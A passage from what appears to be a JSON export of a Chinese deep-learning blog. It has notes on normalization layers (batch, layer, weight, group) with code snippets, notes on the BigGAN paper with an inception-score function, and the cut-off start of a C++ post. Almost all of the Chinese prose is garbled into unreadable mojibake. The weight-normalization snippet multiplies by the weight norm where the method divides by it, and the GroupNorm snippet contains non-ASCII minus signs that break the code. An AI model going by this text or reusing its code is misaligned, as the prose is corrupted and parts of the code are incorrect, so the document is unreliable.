å°„åˆ°æ¿€æ´»å‡½æ•°çš„éé¥±å’ŒåŒºï¼ˆçº¿æ€§åŒºï¼‰ï¼Œä»…åˆ©ç”¨åˆ°äº†çº¿æ€§å˜åŒ–èƒ½åŠ›ï¼Œä»è€Œé™ä½äº†ç¥ç»ç½‘ç»œçš„è¡¨è¾¾èƒ½åŠ›ã€‚è€Œè¿›è¡Œå†å˜æ¢ï¼Œåˆ™å¯ä»¥å°†æ•°æ®ä»çº¿æ€§åŒºå˜æ¢åˆ°éçº¿æ€§åŒºï¼Œæ¢å¤æ¨¡å‹çš„è¡¨è¾¾èƒ½åŠ›ï¼ˆæƒ³æƒ³æ¿€æ´»å‡½æ•°ï¼‰ ä¸»æµ Normalization æ–¹æ³•æ¢³ç† Batch Normalization â€”â€” çºµå‘è§„èŒƒåŒ–ï¼šæ•´ä¸ªbatchçš„ä¸åŒç»´åº¦ï¼ˆchannelï¼‰ image å…¶ä¸­ æ˜¯ mini-batch çš„å¤§å°ã€‚ç”±äº BN æ˜¯é’ˆå¯¹å•ä¸ªç»´åº¦å®šä¹‰çš„ï¼Œå› æ­¤æ ‡å‡†å…¬å¼ä¸­çš„è®¡ç®—å‡ä¸º element-wiseã€‚ ç„¶åï¼Œç”¨ä¸€ä¸ª mini-batch çš„ä¸€é˜¶ç»Ÿè®¡é‡å’ŒäºŒé˜¶ç»Ÿè®¡é‡ï¼Œè§„èŒƒæ¯ä¸€ä¸ªè¾“å…¥ç»´åº¦ KEYPOINTï¼šmini-batchæ•°æ®å†³å®šï¼Œxæ¯ä¸ªç»´åº¦çš„åˆ†å¸ƒï¼Œä¸Šå›¾å¯ç†è§£ä¸ºRGBä¸‰ä¸ªé€šé“ã€‚ è¦æ±‚ï¼šæ¯ä¸ª mini-batch æ¯”è¾ƒå¤§ï¼Œæ•°æ®åˆ†å¸ƒæ¯”è¾ƒæ¥è¿‘ï¼Œå……åˆ†çš„ shuffle ä¸é€‚ç”¨ï¼šåŠ¨æ€çš„ç½‘ç»œç»“æ„ å’Œ RNN ç½‘ç»œ ï¼ˆæœ€åæ‰çŸ¥é“mini-batchçš„\\(\\mu\\)ï¼‰ã€‚Batch NormalizationåŸºäºä¸€ä¸ªmini batchçš„æ•°æ®è®¡ç®—å‡å€¼å’Œæ–¹å·®ï¼Œè€Œä¸æ˜¯åŸºäºæ•´ä¸ªTraining setæ¥åšï¼Œç›¸å½“äºè¿›è¡Œæ¢¯åº¦è®¡ç®—å¼å¼•å…¥å™ªå£°ã€‚å› æ­¤ï¼ŒBatch Normalizationä¸é€‚ç”¨äºå¯¹å™ªå£°æ•æ„Ÿçš„å¼ºåŒ–å­¦ä¹ ã€ç”Ÿæˆæ¨¡å‹ï¼ˆGenerative modelï¼šGANï¼ŒVAEï¼‰ä½¿ç”¨ã€‚ 12345678910111213141516171819def batch_normalization_layer(inputs, out_size, isTrain=True): # in_size, out_size = inputs.get_shape() pop_mean = tf.Variable(tf.zeros([out_size]),trainable=False) pop_var = tf.Variable(tf.ones([out_size]),trainable=False) scale = tf.Variable(tf.ones([out_size])) shift = tf.Variable(tf.zeros([out_size])) eps = 0.001 decay = 0.999 if isTrain: # batchçš„meanå’Œvarã€‚ æ³¨åŸå§‹ç»´åº¦ä¸º[batch_size, height, width, channel] batch_mean, batch_var = tf.nn.moments(inputs,[0,1,2]) print(batch_mean.get_shape()) # è®°å½•è®­ç»ƒçš„meanå’Œvar train_mean = tf.assign(pop_mean, pop_mean * decay + batch_mean * (1-decay)) train_var = tf.assign(pop_var, pop_var * decay + batch_var * (1-decay)) with tf.control_dependencies([train_mean,train_var]): return tf.nn.batch_normalization(inputs,batch_mean,batch_var,shift,scale,eps) else: return tf.nn.batch_normalization(inputs,pop_mean,pop_var,shift,scale,eps) ref Synchronized-BatchNorm-PyTorchï¼Œå¤šGPUåˆ†å¸ƒå¼åŒæ­¥å„ä¸ªèŠ‚ç‚¹çš„æ•°æ®meanå’Œvar Layer Normalization â€”â€” æ¨ªå‘è§„èŒƒåŒ–ï¼šå•ä¸ªè¾“å…¥ https://arxiv.org/abs/1607.06450 image è€ƒè™‘ä¸€å±‚æ‰€æœ‰ç»´åº¦çš„è¾“å…¥ï¼Œè®¡ç®—è¯¥å±‚çš„å¹³å‡è¾“å…¥å€¼å’Œè¾“å…¥æ–¹å·®ï¼Œç„¶åç”¨åŒä¸€ä¸ªè§„èŒƒåŒ–æ“ä½œæ¥è½¬æ¢å„ä¸ªç»´åº¦çš„è¾“å…¥ æšä¸¾äº†è¯¥å±‚æ‰€æœ‰çš„è¾“å…¥ç¥ç»å…ƒã€‚å¯¹åº”åˆ°æ ‡å‡†å…¬å¼ä¸­ï¼Œå››å¤§å‚æ•° , , , å‡ä¸ºæ ‡é‡ï¼ˆBNä¸­æ˜¯å‘é‡ï¼‰ï¼Œæ‰€æœ‰è¾“å…¥å…±äº«ä¸€ä¸ªè§„èŒƒåŒ–å˜æ¢ KEYPOINTï¼šLN é’ˆå¯¹å•ä¸ªè®­ç»ƒæ ·æœ¬è¿›è¡Œï¼Œç”¨äº å°mini-batchåœºæ™¯ã€åŠ¨æ€ç½‘ç»œåœºæ™¯å’Œ RNNï¼Œç‰¹åˆ«æ˜¯è‡ªç„¶è¯­è¨€å¤„ç†é¢†åŸŸã€‚æ­¤å¤–ï¼ŒLN ä¸éœ€è¦ä¿å­˜ mini-batch çš„å‡å€¼å’Œæ–¹å·®ï¼ŒèŠ‚çœäº†é¢å¤–çš„å­˜å‚¨ç©ºé—´ NOTEï¼šå¦‚æœä¸åŒè¾“å…¥ç‰¹å¾ä¸å±äºç›¸ä¼¼çš„ç±»åˆ«ï¼ˆæ¯”å¦‚é¢œè‰²å’Œå¤§å°ï¼‰ï¼Œé‚£ä¹ˆ LN çš„å¤„ç†å¯èƒ½ä¼šé™ä½æ¨¡å‹çš„è¡¨è¾¾èƒ½åŠ›ã€‚ 1234567891011121314151617class layer_norm(Function): @staticmethod def forward(input, gain=None, bias=None): # è¿™é‡Œçš„è¾“å…¥æ˜¯unrollçš„ï¼Œ[batch_size, h x w x c]ï¼ŒæŒ‰å®ä¾‹norm mean = input.mean(-1, keepdim=True) var = input.var(-1, unbiased=False, keepdim=True) input_normalized = (input - mean) / torch.sqrt(var + 1e-9) if gain is not None and bias is not None: output = input_normalized * gain + bias elif not (gain is None and bias is None): raise RuntimeError(\"gain and bias of LayerNorm should be both None or not None!\") else: output = input_normalized return output ... Weight Normalization â€”â€” å‚æ•°è§„èŒƒåŒ– https://arxiv.org/abs/1602.07868 å°†ä»¥ä¸‹æ–¹ç¨‹ ç†è§£ä¸ºï¼š . BN å’Œ LN å‡å°†è§„èŒƒåŒ–åº”ç”¨äºè¾“å…¥çš„ç‰¹å¾æ•°æ® WNå°†è§„èŒƒåŒ–åº”ç”¨äºçº¿æ€§å˜æ¢çš„æƒé‡ ç”¨ç¥ç»å…ƒçš„æƒé‡çš„æ¬§æ°èŒƒæ•°å¯¹è¾“å…¥æ•°æ®è¿›è¡Œ scaleã€‚ æ˜¯ç¥ç»å…ƒçš„æƒé‡çš„æ¬§æ°èŒƒæ•°ï¼Œå› æ­¤ æ˜¯å•ä½å‘é‡ï¼Œå†³å®šäº† çš„æ–¹å‘ï¼› æ˜¯æ ‡é‡ï¼Œå†³å®šäº† çš„é•¿åº¦ã€‚ KEYPOINTï¼šWN çš„è§„èŒƒåŒ–ä¸ç›´æ¥ä½¿ç”¨è¾“å…¥æ•°æ®çš„ç»Ÿè®¡é‡ï¼Œå› æ­¤é¿å…äº† BN è¿‡äºä¾èµ– mini-batch çš„ä¸è¶³ï¼Œä»¥åŠ LN æ¯å±‚å”¯ä¸€è½¬æ¢å™¨çš„é™åˆ¶ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ç”¨äºåŠ¨æ€ç½‘ç»œç»“æ„ Weight Normalizationå¯¹é€šè¿‡æ ‡é‡gå’Œå‘é‡vå¯¹æƒé‡Wè¿›è¡Œé‡å†™ï¼Œé‡å†™å‘é‡væ˜¯å›ºå®šçš„ï¼Œå› æ­¤ï¼ŒåŸºäºWeight Normalizationçš„Normalizationæ¯”Batch Normalizationå¼•å…¥æ›´å°‘çš„å™ªå£°ã€‚ 123456789101112131415161718192021222324def _weight_norm(v, g): 'vå°±æ˜¯weights' norm = torch.norm(v, 2) return v * (g * norm)def norm_except_dim(v, pow, dim): 'è®¡ç®—gï¼š norm_except_dim(weight, 2, dim).data' if dim is None: return v.norm() if dim != 0: v = v.transpose(0, dim) output_size = (v.size(0),) + (1,) * (v.dim() - 1) v = v.contiguous().view(v.size(0), -1).norm(dim=1).view(*output_size) if dim != 0: v = v.transpose(0, dim) return vclass WeightNorm: ... def compute_weight(self, module): g = getattr(module, self.name + '_g') v = getattr(module, self.name + '_v') return _weight_norm(v, g) ... Cosine Normalization â€”â€” ä½™å¼¦è§„èŒƒåŒ– å…¶ä¸­ æ˜¯ å’Œ çš„å¤¹è§’ã€‚æ‰€æœ‰çš„æ•°æ®å°±éƒ½æ˜¯ [-1, 1] åŒºé—´ã€‚ è¶…ç®€å•çš„å˜åŒ–ï¼Œç›´æ¥åœ¨wxçš„ä¸Šscaleï¼Œå¹¶ä¸”ä¸éœ€è¦å†æ¬¡ç¼©æ”¾ã€‚ å°† ç‚¹ç§¯ã€‹ã€‹ã€‹å˜ä¸ºä½™å¼¦ç›¸ä¼¼åº¦ Instance Norm image InstanceNormç­‰ä»·äºå½“Group Normçš„num_groupsç­‰äºnum_channel. Group Norm https://arxiv.org/abs/1803.08494 image å½“Group Normä¸­groupçš„æ•°é‡æ˜¯1çš„æ—¶å€™, æ˜¯ä¸LayerNormæ˜¯ç­‰ä»·çš„ 12345678910111213def GroupNorm(x, gamma, beta, G, eps=1eâˆ’5): # x: input features with shape [N,C,H,W] # gamma, beta: scale and offset, with shape [1,C,1,1] # G: number of groups for GN N, C, H, W = x.shape # groupåˆ’åˆ† x = tf.reshape(x, [N, G, C // G, H, W]) # æŒ‰groupæ±‚mean var mean, var = tf.nn.moments(x, [2, 3, 4], keepdims=True) x = (xâˆ’mean) / tf.sqrt(var + eps) x = tf.reshape(x, [N, C, H, W]) return xâˆ—gamma + beta Normalization ä¸ºä»€ä¹ˆä¼šæœ‰æ•ˆï¼Ÿ æƒé‡ä¼¸ç¼©ä¸å˜æ€§ï¼ˆweight scale invarianceï¼‰ å…¶ä¸­ ã€‚ ç”±äº å› æ­¤ï¼Œæƒé‡çš„ä¼¸ç¼©å˜åŒ–ä¸ä¼šå½±å“åå‘æ¢¯åº¦çš„ Jacobian çŸ©é˜µï¼Œå› æ­¤ä¹Ÿå°±å¯¹åå‘ä¼ æ’­æ²¡æœ‰å½±å“ï¼Œé¿å…äº†åå‘ä¼ æ’­æ—¶å› ä¸ºæƒé‡è¿‡å¤§æˆ–è¿‡å°å¯¼è‡´çš„æ¢¯åº¦æ¶ˆå¤±æˆ–æ¢¯åº¦çˆ†ç‚¸é—®é¢˜ï¼Œä»è€ŒåŠ é€Ÿäº†ç¥ç»ç½‘ç»œçš„è®­ç»ƒ å‚æ•°æ­£åˆ™ ç”±äº å› æ­¤ï¼Œä¸‹å±‚çš„æƒé‡å€¼è¶Šå¤§ï¼Œ\\(\\lambda\\)è¶Šå¤§ï¼Œé‚£ä¹ˆå…¶æ¢¯åº¦å°±è¶Šå°ã€‚è¿™æ ·ï¼Œå‚æ•°çš„å˜åŒ–å°±è¶Šç¨³å®šï¼Œç›¸å½“äºå®ç°äº†å‚æ•°æ­£åˆ™åŒ–çš„æ•ˆæœï¼Œé¿å…å‚æ•°çš„å¤§å¹…éœ‡è¡ï¼Œæé«˜ç½‘ç»œçš„æ³›åŒ–æ€§èƒ½ã€‚ æ•°æ®ä¼¸ç¼©ä¸å˜æ€§ï¼ˆdata scale invarianceï¼‰ å½“æ•°æ® æŒ‰ç…§å¸¸é‡ è¿›è¡Œä¼¸ç¼©æ—¶ï¼Œå¾—åˆ°çš„è§„èŒƒåŒ–åçš„å€¼ä¿æŒä¸å˜ï¼Œå³ï¼š å…¶ä¸­ ã€‚ æ•°æ®ä¼¸ç¼©ä¸å˜æ€§ä»…å¯¹ BNã€LN å’Œ CN æˆç«‹ã€‚WN ä¸å…·æœ‰è¿™ä¸€æ€§è´¨ã€‚å¾ˆæ˜æ˜¾ã€‚ æ•°æ®ä¼¸ç¼©ä¸å˜æ€§å¯ä»¥æœ‰æ•ˆåœ°å‡å°‘æ¢¯åº¦å¼¥æ•£ï¼Œç®€åŒ–å¯¹å­¦ä¹ ç‡çš„é€‰æ‹© æŸä¸€å±‚ç¥ç»å…ƒ è€Œè¨€ï¼Œå±•å¼€å¯å¾—ï¼ˆä»¥ä¸‹å¼å­ä¸ºç¤ºæ„ï¼Œæ²¡å†™å…¥æ¿€æ´»å‡½æ•°ï¼‰ æ¯ä¸€å±‚ç¥ç»å…ƒçš„è¾“å‡ºä¾èµ–äºåº•ä¸‹å„å±‚çš„è®¡ç®—ç»“æœã€‚å†æ¬¡å›å¿†activition functionçš„å›¾åƒ å¦‚æœæ²¡æœ‰æ­£åˆ™åŒ–ï¼Œå½“ä¸‹å±‚è¾“å…¥å‘ç”Ÿä¼¸ç¼©å˜åŒ–æ—¶ï¼Œç»è¿‡å±‚å±‚ä¼ é€’ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ•°æ®å‘ç”Ÿå‰§çƒˆçš„è†¨èƒ€æˆ–è€…å¼¥æ•£ï¼Œä»è€Œä¹Ÿå¯¼è‡´äº†åå‘è®¡ç®—æ—¶çš„æ¢¯åº¦çˆ†ç‚¸æˆ–æ¢¯åº¦å¼¥æ•£ã€‚ è€Œè¨€ï¼Œå…¶è¾“å…¥ æ°¸è¿œä¿æŒæ ‡å‡†çš„åˆ†å¸ƒï¼Œè¿™å°±ä½¿å¾—é«˜å±‚çš„è®­ç»ƒæ›´åŠ ç®€å•ã€‚ä»æ¢¯åº¦çš„è®¡ç®—å…¬å¼æ¥çœ‹ï¼š æ•°æ®çš„ä¼¸ç¼©å˜åŒ–ä¹Ÿä¸ä¼šå½±å“åˆ°å¯¹è¯¥å±‚çš„æƒé‡å‚æ•°æ›´æ–°ï¼Œä½¿å¾—è®­ç»ƒè¿‡ç¨‹æ›´åŠ é²æ£’ï¼Œç®€åŒ–äº†å¯¹å­¦ä¹ ç‡çš„é€‰æ‹©ã€‚ å‚è€ƒé“¾æ¥ï¼šhttps://zhuanlan.zhihu.com/p/33173246","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"DL","slug":"Notes/DL","permalink":"https://racleray.github.io/categories/Notes/DL/"}],"tags":[{"name":"deep learning","slug":"deep-learning","permalink":"https://racleray.github.io/tags/deep-learning/"},{"name":"normalization","slug":"normalization","permalink":"https://racleray.github.io/tags/normalization/"}]},{"title":"Large scale GAN training for high fidelity natural image synthesis","slug":"Large-scale-GAN-training-for-high-fidelity-natural-image-synthesis","date":"2020-08-04T08:08:56.000Z","updated":"2023-08-07T11:54:31.031Z","comments":true,"path":"posts/204efe7c.html","link":"","permalink":"https://racleray.github.io/posts/204efe7c.html","excerpt":"è¿™æ˜¯å¾—ç©ºå¬ç™¾åº¦paddleå¹³å°å…¬å¼€è¯¾çš„ä¸€ä¸ªå°ä½œä¸šï¼Œé€‰äº†ä¸€ç¯‡å¾ˆç®€å•çš„è®ºæ–‡è¯»è¯»ã€‚ç»“è®ºæœ‰ä¸€å®šå‚è€ƒä»·å€¼ï¼Œè™½ç„¶å¾ˆå°‘ç”¨åˆ°GANã€‚","text":"é—®é¢˜ GANç”Ÿæˆå›¾åƒçš„è¿‡ç¨‹æ˜¯ä¸€ä¸ªæ•æ„Ÿçš„è¿‡ç¨‹ã€‚è™½ç„¶ç›¸æ¯”äºVAEï¼Œå…¶ä¼˜åŒ–ç›®æ ‡ä»Elmoæœ€ä¼˜æŸå¤±å‡½æ•°çš„ä¸€ä¸ªä¸‹ç•Œï¼Œå˜ä¸ºç›´æ¥ä¼˜åŒ–ç”Ÿæˆç»“æœå’Œç›®æ ‡ä¹‹é—´å·®å¼‚æŸå¤±æœ¬èº«ï¼Œç›´è§‰ä¸Šæ˜¯ä¸€ç§æ›´å¥½çš„æ–¹æ³•ï¼Œä½†æ˜¯ç”±äºåŠ¨æ€åœ°äº¤å‰è®­ç»ƒç”Ÿæˆå™¨ä¸åˆ¤åˆ«å™¨ï¼Œå¯¼è‡´å¯¹ç½‘ç»œè®¾è®¡ã€è®­ç»ƒæ–¹æ³•ã€å‚æ•°è®¾ç½®ç­‰éå¸¸æ•æ„Ÿã€‚ å°½ç®¡æœ‰ç ”ç©¶è¡¨æ˜åœ¨ç»éªŒå’Œç†è®ºä¸Šï¼Œè·å¾—äº†åœ¨å¤šç§è®¾ç½®ä¸­å¯ä»¥å®ç°ç¨³å®šè®­ç»ƒçš„ç»“è®ºã€‚ä½†æ˜¯GANç”Ÿæˆç½‘ç»œçš„æ•ˆæœå§‹ç»ˆæœ‰ç‚¹å·®å¼ºäººæ„ã€‚ å½“å‰åœ¨Image Netå»ºæ¨¡ä¸Šçš„æœ€ä½³ç»“æœä»…è¾¾åˆ°äº†52.5çš„ISï¼Œè€ŒçœŸå®æ•°æ®æœ‰233çš„ISã€‚ Is( inception score)ï¼šç”¨æ¥è¡¡é‡GANç½‘ç»œçš„ä¸¤ä¸ªæŒ‡æ ‡: ç”Ÿæˆå›¾ç‰‡çš„è´¨é‡å’Œå¤šæ ·æ€§ entropy = -sum(p_i * log(p_i)) The conditional probability captures our interest in image quality. KL (C || M) : KL divergence = p(y|x) * (log(p(y|x)) â€“ log(p(y))) The average of the KL divergence for all generated images. C for conditional and M for marginal distributions. 1234567891011121314151617181920# calculate inception score in numpyfrom numpy import asarrayfrom numpy import expand_dimsfrom numpy import logfrom numpy import meanfrom numpy import exp # calculate the inception score for p(y|x)def calculate_inception_score(p_yxï¼Œ eps=1E-16): # calculate p(y) p_y = expand_dims(p_yx.mean(axis=0)ï¼Œ 0) # kl divergence for each image kl_d = p_yx * (log(p_yx + eps) - log(p_y + eps)) # sum over classes sum_kl_d = kl_d.sum(axis=1) # average over images avg_kl_d = mean(sum_kl_d) # undo the logs is_score = exp(avg_kl_d) return is_score ä½†æ˜¯æœ‰ä¸€ä¸ªç¼ºé™·ï¼Œæ¦‚ç‡è®¡ç®—æ˜¯å»ºç«‹åœ¨Inceptionæ•°æ®é›†é™åˆ¶çš„1000ç§ç±»åˆ«ä¸­çš„ï¼Œä¸åœ¨å…¶ä¸­çš„ç±»åˆ«åˆ™æ— æ³•è¯„ä¼°ï¼ŒåŒæ—¶è¦è¾¾åˆ°è¾ƒå¥½çš„æ•ˆæœï¼Œè®¡ç®—scoreæ—¶ï¼Œä¸åŒç±»åˆ«ä¸­çš„æ•°æ®åˆ†å¸ƒæœ€å¥½æ˜¯æ¯”è¾ƒå‡åŒ€çš„ã€‚ ã€ŠLarge scale GAN training for high fidelity natural image synthesisã€‹çš„ç ”ç©¶æ­£æ˜¯æ¢ç´¢ç”Ÿæˆæ•ˆæœçš„ä¸€é¡¹æˆæœï¼Œä½œè€…æˆåŠŸåœ°å°†GANç”Ÿæˆå›¾åƒå’ŒçœŸå®å›¾åƒä¹‹é—´çš„ä¿çœŸåº¦å’Œå¤šæ ·æ€§gapå¤§å¹…é™ä½ã€‚ æ–¹æ³• é«˜åˆ†è¾¨ç‡èƒ½å¤Ÿå¸¦æ¥æ›´ä¸ºçœŸå®çš„ç”Ÿæˆå›¾åƒï¼Œåœ¨è¿™æ ·çš„æ€æƒ³çš„æŒ‡å¯¼ä¸‹ï¼Œæœ¬è®ºæ–‡ç»“åˆäº†GANçš„å„ç§æ–°æŠ€æœ¯ï¼Œå¹¶ä¸”åˆ†æäº†è®­ç»ƒéš¾çš„åŸå› ï¼Œæœ€åæå‡ºè‡ªå·±çš„æ¨¡å‹ã€‚ æœ¬æ–‡å±•ç¤ºäº†GANå¯ä»¥ä»è®­ç»ƒè§„æ¨¡ä¸­æ˜¾è‘—è·ç›Šï¼Œå¹¶ä¸”èƒ½åœ¨å‚æ•°æ•°é‡å¾ˆå¤§å’Œå…«å€Batch sizeäºä¹‹å‰æœ€ä½³ç»“æœï¼Œçš„æ¡ä»¶ä¸‹ï¼Œä»ç„¶èƒ½ä»¥2å€åˆ°4å€çš„é€Ÿåº¦è¿›è¡Œè®­ç»ƒã€‚ ä½œè€…å¼•å…¥äº†ä¸¤ç§ç®€å•çš„ç”Ÿæˆæ¶æ„å˜åŒ–ï¼Œæé«˜äº†å¯æ‰©å±•æ€§ï¼Œå¹¶ä¿®æ”¹äº†æ­£åˆ™åŒ–æ–¹æ¡ˆä»¥æå‡conditioningï¼Œé€šè¿‡å®éªŒè¯´æ˜äº†è¿™æ ·å¯ä»¥æå‡æ€§èƒ½ã€‚ image è¿™ç¯‡è®ºæ–‡æ²¡æœ‰æå‡ºæ–°çš„æ¨¡å‹ï¼Œåªæ˜¯å°†åŸæœ‰çš„GANçš„æ¨¡å‹ï¼š ç”¨8å€åŸæœ‰çš„batch sizeå¤§å° å°†éšå±‚çš„å˜é‡æ•°é‡æ‰©å……åˆ°åŸæœ‰æ¨¡å‹çš„4å€ è®­ç»ƒè·å¾—äº†å¾ˆå¥½çš„å›¾ç‰‡ç”Ÿæˆçš„æ•ˆæœã€‚ä¸æ­¤åŒæ—¶ï¼Œåœ¨æ‰©å……äº†å˜é‡æ•°é‡å’Œ batch sizeå¤§å°åï¼Œæ¨¡å‹å‡ºç°äº†ä¸ç¨³å®šçš„ç°è±¡ã€‚ æ–‡ç« ä¸­å¯¹å‡ºç°çš„ä¸ç¨³å®šç°è±¡ï¼Œé‡‡ç”¨ç°æœ‰çš„æ¯”è¾ƒæœ‰æ•ˆçš„ç¨³å®šè®­ç»ƒGANçš„æ–¹æ³•ï¼Œä½†æ˜¯æ–‡ä¸­å‘ç°è¿™æ ·ç¡®å®ä¼šç¨³å®šGANçš„è®­ç»ƒï¼Œä½†æ˜¯åŒæ—¶ä¼šæ –ç‰²ç”Ÿæˆå›¾ç‰‡çš„è´¨é‡ã€‚ å®éªŒç»“æœ ç ”ç©¶è¡¨æ˜æŒ‰8çš„å€æ•°å¢åŠ æ‰¹å¤§å°å¯ä»¥å°†å½“å‰æœ€ä½³çš„ISæé«˜46%ã€‚ ç ”ç©¶è€…å‡è®¾è¿™æ˜¯ç”±äºæ¯ä¸ªæ‰¹é‡è¦†ç›–äº†æ›´å¤šçš„æ¨¡å¼ï¼Œä¸ºç”Ÿæˆå™¨å’Œé‰´åˆ«å™¨éƒ½æä¾›äº†æ›´å¥½çš„æ¢¯åº¦ä¿¡æ¯ã€‚ è¿™ç§æ‰©æ‰†å¸¦æ¥çš„å€¼å¾—æ³¨æ„çš„å‰¯ä½œç”¨æ˜¯ï¼Œæ¨¡å‹ä»¥æ›´å°‘çš„è¿­ä»£æ¬¡æ•°è¾¾åˆ°äº†æ›´å¥½çš„æ€§èƒ½ï¼Œä½†å˜å¾—ä¸ç¨³å®šå¹¶ä¸”é­é‡äº†å®Œå…¨çš„è®­ç»ƒå´©æºƒã€‚ å› æ­¤åœ¨å®éªŒä¸­ï¼Œç ”ç©¶è€…åœ¨å´©æºƒåˆšå¥½å‘ç”Ÿä¹‹åç«‹åˆ»åœæ­¢è®­ç»ƒï¼Œå¹¶ä»ä¹‹å‰ä¿å­˜çš„æ£€æŸ¥ç‚¹è¿›è¡Œç»“æœæŠ¥å‘Šã€‚ å¢åŠ äº†æ¯ä¸ªå±‚50%çš„å®½åº¦(é€šé“æ•°é‡)ï¼Œè¿›ä¸€æ­¥çš„21%çš„ISæå‡ã€‚ ç”Ÿæˆå™¨å’Œé‰´åˆ«å™¨ä¸­çš„å‚æ•°æ•°é‡å‡ ä¹ç¿»å€ã€‚ç ”ç©¶è€…å‡è®¾è¿™æ˜¯ç”±äºæ¨¡å‹ç›¸å¯¹äºæ•°æ®é›†å¤æ‚åº¦çš„å®¹é‡çš„å¢åŠ ã€‚å°†æ·±åº¦ç¿»å€ï¼Œåœ¨ImageNet Basedæ¨¡å‹ä¸Šï¼Œåè€Œä¼šé™ä½æ€§èƒ½ã€‚ å…¶ä»–æŠ€å·§ æˆªæ–­æŠ€å·§ ç”Ÿæˆå™¨çš„éšæœºå™ªå£°è¾“å…¥ä¸€èˆ¬ä½¿ç”¨æ­£æ€åˆ†å¸ƒæˆ–è€…å‡åŒ€åˆ†å¸ƒçš„éšæœºæ•°ã€‚ æœ¬æ–‡é‡‡ç”¨äº†æˆªæ–­æŠ€æœ¯ï¼Œå¯¹æ­£æ€åˆ†å¸ƒçš„éšæœºæ•°è¿›è¡Œæˆªæ–­å¤„ç†ï¼Œå®éªŒå‘ç°è¿™ç§æ–¹æ³•çš„ç»“æœæœ€å¥½ã€‚ å¯¹æ­¤çš„ç›´è§‚è§£é‡Šæ˜¯ï¼Œå¦‚æœç½‘ç»œçš„éšæœºå™ªå£°è¾“å…¥çš„éšæœºæ•°å˜åŠ¨èŒƒå›´è¶Šå¤§ï¼Œç”Ÿæˆçš„æ ·æœ¬åœ¨æ ‡å‡†æ¨¡æ¿ä¸Šçš„å˜åŠ¨å°±è¶Šå¤§ï¼Œå› æ­¤æ ·æœ¬çš„å¤šæ ·æ€§å°±è¶Šå¼ºï¼Œä½†çœŸå®æ€§å¯èƒ½ä¼šé™ä½ã€‚ é¦–å…ˆç”¨æˆªæ–­æ€åˆ†å¸ƒNï¼ˆ0ï¼Œ1ï¼‰éšæœºæ•°äº§ç”Ÿå™ªå£°å‘é‡Zï¼Œå…·ä½“åšæ³•æ˜¯å¦‚æœéšæœºæ•°è¶…å‡ºä¸€å®šèŒƒå›´ï¼Œåˆ™é‡æ–°é‡‡æ ·ï¼Œä½¿å¾—å…¶è½åœ¨è¿™ä¸ªåŒºé—´é‡Œã€‚ è¿™ç§åšæ³•ç§°ä¸ºæˆªæ–­æŠ€å·§ï¼šå‘é‡Zçš„æ¨¡è¶…è¿‡æŸä¸€æŒ‡å®šé˜ˆå€¼çš„éšæœºæ•°è¿›è¡Œé‡é‡†æ ·ï¼Œè¿™æ ·å¯ä»¥æé«˜å•ä¸ªæ ·æœ¬çš„è´¨é‡ï¼Œä½†ä»£ä»·æ˜¯é™ä½äº†æ ·æœ¬çš„å¤šæ ·æ€§ã€‚ å®éªŒååˆ†æ ç”Ÿæˆå™¨çš„ä¸ç¨³å®šæ€§ æœ¬æ–‡ç€é‡å¯¹å°è§„æ¨¡æ—¶ç¨³å®šï¼Œå¤§è§„æ¨¡æ—¶ä¸ç¨³å®šçš„é—®é¢˜è¿›è¡Œåˆ†æã€‚ å®éªŒä¸­å‘ç°ï¼Œæƒé‡çŸ©é˜µçš„å‰3ä¸ªå¥‡å¼‚å€¼Ïƒ0ï¼ŒÏƒ1ï¼ŒÏƒ2è˜Šå«çš„ä¿¡æ¯æœ€ä¸°å¯Œã€‚ åœ¨è®­ç»ƒä¸­ï¼ŒGçš„å¤§éƒ¨åˆ†å±‚çš„è°±èŒƒæ•°éƒ½æ˜¯æ­£å¸¸çš„ï¼Œä½†æœ‰ä¸€äº›æ˜¯ç—…æ€çš„ï¼Œè¿™äº›è°±èŒƒæ•°éšç€è®­ç»ƒçš„è¿›è¡Œä¸æ–­çš„å¢é•¿ï¼Œæœ€åçˆ†ç‚¸ï¼Œå¯¼è‡´è®­ç»ƒåå¡Œã€‚ ç»“è®º æœ¬æ–‡è¯æ˜äº†å°†GANç”¨äºå¤šç±»è‡ªç„¶å›¾åƒç”Ÿæˆä»»åŠ¡æ—¶ï¼ŒåŠ å¤§æ¨¡å‹çš„è§„æ¨¡å¯ä»¥æ˜¾è‘—çš„æé«˜ç”Ÿæˆçš„å›¾åƒçš„è´¨é‡ï¼Œå¯¹ç”Ÿæˆçš„æ ·æœ¬çš„çœŸå®æ€§å’Œå¤šæ ·æ€§éƒ½æ˜¯å¦‚æ­¤ã€‚ é€šè¿‡ä½¿ç”¨ä¸€äº›æŠ€å·§ï¼Œæœ¬æ–‡æå‡ºçš„æ–¹æ³•çš„æ€§èƒ½è¾ƒä¹‹å‰çš„æ–¹æ³•æœ‰äº†å¤§åº¦çš„æé«˜ã€‚ å¦å¤–ï¼Œè¿˜åˆ†æäº†å¤§è§„æ¨¡GANåœ¨è®­ç»ƒæ—¶çš„æœºåˆ¶ï¼Œç”¨å®ƒä»¬çš„æƒé‡çŸ©é˜µçš„å¥‡å¼‚å€¼æ¥åˆ»ç”»å®ƒä»¬çš„ç¨³å®šæ€§ã€‚ è®¨è®ºäº†ç¨³å®šæ€§å’Œæ€§èƒ½å³ç”Ÿæˆçš„å›¾åƒçš„è´¨é‡ä¹‹é—´çš„ç›¸äº’ä½œç”¨å’Œå½±å“ å‚è€ƒé“¾æ¥ï¼š ç™¾åº¦è®ºæ–‡å¤ç°è¯¾ç¨‹ï¼šhttps://aistudio.baidu.com/aistudio/education/group/info/1340","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"DL","slug":"Notes/DL","permalink":"https://racleray.github.io/categories/Notes/DL/"}],"tags":[{"name":"gan","slug":"gan","permalink":"https://racleray.github.io/tags/gan/"}]},{"title":"C++ Projectä½¿ç”¨å¤–éƒ¨åº“","slug":"C-Projectä½¿ç”¨å¤–éƒ¨åº“","date":"2020-07-08T04:59:37.000Z","updated":"2023-08-07T11:54:31.026Z","comments":true,"path":"posts/b7fe0c52.html","link":"","permalink":"https://racleray.github.io/posts/b7fe0c52.html","excerpt":"è®°å½•å°è¯•GLFW 